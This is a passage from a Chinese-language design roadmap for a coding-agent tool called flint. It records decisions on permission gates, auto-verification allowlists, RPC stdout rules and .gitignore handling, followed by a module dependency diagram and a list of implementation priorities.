  答"这次调用要不要做"；前者是默认拒写，答"要不要解这把锁"。**若塞进同一个 key 空间，用户对
  `write` 点一次"本次全部允许"，锁就被静默打开**（最难查的那类失效）。选项：**A** 独立许可通道
  （每次显式确认、**永不进 allowlist**），落点复用 R3 拦 `write/edit` 命中锁定路径 → deny +
  "改目标文档需先解锁"，解锁为**会话级位**；**B** 只靠提示词自觉（无确定性兜底）；**C** 目标文档
  一律只读、要改只能追加修订记录。**建议 A** —— 它与 10.4.1 计划模式**共用同一套"批准令牌"**
  （两者本质同一件事：**先对齐再动手**），顺带把 10.4.1 从"会话级开关"提升为可复用的批准原语。

**需要拍板（设计选择，不推翻任何东西）**

- **C4 · 仓库状态注入放哪一层（10.5.5）** —— 注入层纪律是"越稳定越靠前"，而分支/脏文件数每轮会变。
  选项：**A** 放进变化段（task 层之后）；**B** 不进 system，改为 `/status` 或工具按需查。**建议 B**
  ——它本质是"查询结果"，不是"规则"。
- **C5 · 自动验证要不要过权限闸（10.6.2）** —— 选项：**A** 只自动跑 10.6.1 注册表里**登记过的**
  项目命令（白名单内免弹窗）；**B** 一律弹窗（体验差）；**C** 一律免弹窗（不安全）。**建议 A**，
  这让 10.6.1 从"体验优化"升级为"安全机制的前置条件"——两条应一起做。
  **已拍定（2026-09-15）：选 A**（随 10.6.2 一起落地）。落点 = cwd 下的 `.flint/postcheck.json`，
  一份**用户手写**的登记表：项目自己写下的命令**声明即授权**、免弹窗；C 不可行（等于把不认识的
  命令免弹窗执行），B 同样不可行（每写一个文件弹一次，没人受得了）。10.6.1 的**发现**半边仍独立
  未做：本条给的是登记表的**最小实现**（用户手填），"自动从 package.json / Makefile 发现并填表"
  留给 10.6.1。
  **补记（2026-09-15 晚）**：发现半边已随 **10.6.1** 同日落地 —— 但选 A 的判据**不受影响**：
  `{"use":"名字"}` 只是换了一种**写法**，授权依旧来自"人写下的那份登记表"，
  **只发现、没登记仍然什么都不跑**。
- **C6 · 后台任务与 stdout 纯净规则（10.10.1）** —— P8 起 `rpc.ts` 的 stdout 是**一行一个 JSON**。
  **结论：不推翻规则，新功能必须服从**——后台进程输出只能进环形缓冲/文件、经 tool 结果回读，
  绝不直写 stdout。这条要写进 10.10.1 的验收标准。**（2026-09-16 标注）10.6.6 的整树执行器守住了这条**：它只把 stdout / stderr 收进内存 buffer 交给调用方，自己一个字都不打印；`bash` 与自检拿到的输出照旧经工具结果回传。
- **C7 · 拦截契约只有"放行/拒绝"两态（阻 10.9.2 / 10.5.2 的"二次确认"）** —— `decodeDeny` 是二值
  契约，且"程序闸先于人闸"。想表达"这条危险，**让我确认一下**"时，二值只能选"直接拒"或"放行"。
  选项：**A** 扩成三态（allow/deny/ask，ask 落回权限弹窗）；**B** 保持二值，危险命令直接拒 + 说明。
  **建议 B 先做**（零契约改动、够用），真觉得"想放行放不了"再上 A。
  **补记（2026-09-18）：B 已经被 10.9.2 用掉了，本条仍**未解**。** 危险命令拦截按 B 落地
  （直接拒 + 教学理由 + 告诉他"要做请在你自己的终端里做"），契约一个字没改。**这条约束的性质
  因此可以写得更清楚了：它不是"必须先解的前置"，而是一张"想要那个能力时的账单"** —— 只有在
  真的出现"这条命令经常正当、却被挡住"的证据时，才值得为它造三态。10.5.2（写侧确认闸）的
  "二次确认"仍然挂着这个 C7。
- **C8 · 计划模式在 RPC 下会形同虚设（10.4.1）** —— 确认闸是**人类交互**，而 RPC 非 TTY 模式权限
  当前**自动放行**（登记在案的已知边界，见 P9 跨项目检索条的"已知边界"）。选项：**A** 先只做 TTY，
  RPC 侧标注"不生效"；**B** 顺带把"RPC 权限收紧"一起做。**建议 A**，但在本节把两条显式关联，
  别让人以为 RPC 下也安全。
- **C9 · 启动提速成果（10.1.1 / 10.1.2 / 10.2.1）** —— 新增探测/读文件要**惰性化或挪出启动关键路径**，
  否则与 P6 第二档"启动关键路径 0 网络请求 + 0.7ms"的成果对撞（这是 IO 不是网络，但方向一致）。
  **10.1.1 已落地（2026-09-17），本条这样答的**：探测**不新增任何文件读取** —— `package.json`
  本来就是启动时读的（给命令表用），画像**复用同一份文本**，净新增只有几次 `existsSync`，
  且**不含子进程**（对比：`probeProject` 的 `gitRoot` 首次可达 721ms，那才是真该惰性的东西，
  它做成了惰性回调）。**"惰性化"在这里的等价物是"不加重关键路径"**，而不是"推迟到首次用到"：
  推迟会把画像与命令表拆成两个刷新率，而命令表的 `run` 串前缀正是从画像派生的 ——
  同刻播种是让两者**不可能分家**的唯一办法。10.1.2 无独立实现（见其表行）；10.2.1 仍候选。
- **C10 · `.gitignore` 感知（10.7.3）会动既有断言** —— verify-tools 里"跳过 `.git/node_modules/dist`"
  的断言必须改成"跳过表 = 内置默认 ∪ `.gitignore`"。属**必然要改的既有断言**，不算破坏设计。
  **已落地（2026-09-15）**：G11 按此口径改写（两半都钉：内置默认仍在 **且** 规则已合入），
  项数不变；两侧是否一致由 `verify-gitignore.ts` 的 D5 单独钉，两条刻意不重复。

**若只挑五个（起手式，已按"零推翻"过滤）**：`10.3.1 + 10.3.2`（任务分层与依赖，只需拍 C3 的
一个语义）→ `10.1.1 + 10.1.2`（项目画像，注意 C9 惰性化）→ **`10.7.3`（.gitignore 感知，改一处
实现、成本最低见效最快 —— **已完成 2026-09-15**）** → **`10.11.1`（`/projects`，R9+R11 都已
就位、纯接线 —— **已完成 2026-09-16**）** → `10.8.1`（`@file`，挂 R4 那个空置现成钩子，
代价是 C2 那条纪律）。其中两个"改一处实现"的复用项（`10.7.3` 与 `10.11.1`）已落地；
`10.3.1/10.3.2` 与 `10.1.1/10.1.2` 仍是候选。**（以紧接着的补记为准 —— 这两组当天也落地了。）**
（**补记 2026-09-17**：`10.3.1 / 10.3.2 / 10.3.4` 已落地，见 P10.3 表；`10.1.1` 同日落地（`10.1.2` 随 10.12.4/10.12.5 早已了结），见 P10.1 表 —— **至此"起手式"里点名的五项全部落地**，其中 `10.3.1+10.3.2`、`10.1.1+10.1.2` 是同一批的两半。剩 `10.8.1`（`@file`）从未开工，代价是 C2 那条纪律。）
（**补记 2026-09-17 第二批：`10.8.1` 也在同日晚间落地，见 P10.8 表 —— 于是"起手式"里点名的每一项都已开工，且 C2 那条"代价"最终**没有付出**：落点选成输入层就绕开了 `tools/spec.ts`（详见 C2 的补记）。**）
**10.12 整组另计**：它有两条前置——10.12.4 要先拍 **C11**；10.12.9 依赖 **10.5.1**（**2026-09-14 已满足**）。

---

## 📊 依赖关系图

> **2026-09-11 重画**：下图补上协议层与任务清单子系统，并修掉此前 `sed` 误伤的
> "上下   文管理"（中间三个空格）。虚线 = 尚未接通。

```
持久化存储 ──→ 上下文管理 ──→ 工具系统 ──→ 技能系统
     │                │            │
     │                │            └──→ 任务清单（TaskStore）
     │                │                     │
     └──→ 多会话管理   │                     ↓ onChange 观察者
                      ↓                  终端面板 / ┈┈→ /traces（未接通）
                  命令系统 ←──── 所有模块都需要
                      │
          ┌───────────┴───────────┐
          ↓                       ↓
      模型切换                 事件订阅
                                  │
                                  ↓
                          RPC 模式（JSON-RPC over stdio，11 方法）
                                  │
                                  ↓ ┈┈ 流式 notification（2026-09-11 已接，见 P8）
                          ACP：编辑器 / Web 前端
```

## 🧭 实施建议

> **2026-09-11 重写**：下面的 1-4 是项目初期写的，四条**已全部完成**（持久化 / 命令系统 /
> 上下文管理 / 工具系统均已落地，见「已完成」表）。原顺序保留作历史，新的优先级见下方。

1. ~~**先做持久化**（P0）——当前一切都在内存里，重启归零，无法实际使用~~ ✅ 已落地
2. ~~**再做命令系统**（P1）——让用户能 `/model` 切模型、`/help` 看帮助~~ ✅ 已落地
3. ~~**然后上下文管理**（P0）——没有上下文控制，长对话必然崩溃~~ ✅ 已落地
4. ~~**接着工具系统**（P2）——Agent 真正做事的入口~~ ✅ 已落地

**当前建议顺序**（2026-09-11）：

1. **协议层与前端解耦（P8）** —— ✅ **流式部分已于 2026-09-11 落地**（细节见上面 P8 第一条的补记）。
   剩下两块都**独立可切**：① 全量对齐 ACP（`session/new` / `session/prompt` / 权限请求 / 文件读写 /
   终端，以及把 `chat` 的 result 从字符串改成 `{ stopReason, usage }`——后者是**破坏性**的，
   等确认无外部消费者再做）；② 背压策略（目前是已知缺口，本地管道很少触发）。
   做完 flint 就能被任意 ACP 客户端（Zed / JetBrains / Toad 等）直接驱动；
   但即便现在不做，映射表那套字段名已经是对的，将来不必推倒重来。
2. **历史结构化数据接通（P6）** —— ✅ **已于 2026-09-12 按方案 B 落地**（thinking 开关分叉，细节见上面 P6 该条的补记）。"模型看得到上一轮调了什么工具"从今天起成立。
3. **工具生命周期 Hook（P6）** —— ✅ **已于 2026-09-12 落地**（`before_tool_call` / `after_tool_call`，
   可拦截、不可改参，细节见上面 P6 Hook 条的补记）。"改完自动跑测试""工具级审计"从今天起有落点。
4. **会话仓库层 / 分支摘要 / 技能热重载（P6）** —— 会话仓库层 ✅ **已于 2026-09-12 落地**（见上面
   P6 会话仓库层条的补记）；分支摘要 ✅ **2026-09-12 核实后关闭、同日用户拍板仍实现**（关闭论据依赖的视图裁剪是坏的，见该条再补记
   核实结论）；技能热重载 ✅ **已于 2026-09-12 落地**（见上面技能依赖追踪条的补记，
   "谁通知 UI"的答案：提示词每轮现取自愈，观察者只服务 UI 提示）。
5. **预编译发行（P6 第三档）** —— 收益递减（第一/二档后启动已 0.7ms 级），优先级最低。
6. **项目管理平台化（P10，2026-09-14 立项）** —— 12 组 / 63 条**候选池**。读法与其它区块不同：
   状态列标 `候选` 的行**尚未立项**，圈选后才转 `待办`；起手式与 C1–C11 冲突清单都在 P10 区块内。
   与 P8/P9 的关系：P8 解决"UI 不再绑死 core"，P9 解决"经验能沉淀"，P10 解决"**项目能被管起来**"
   —— 三块拼起来才是"编程 Agent 平台"的完整形状。
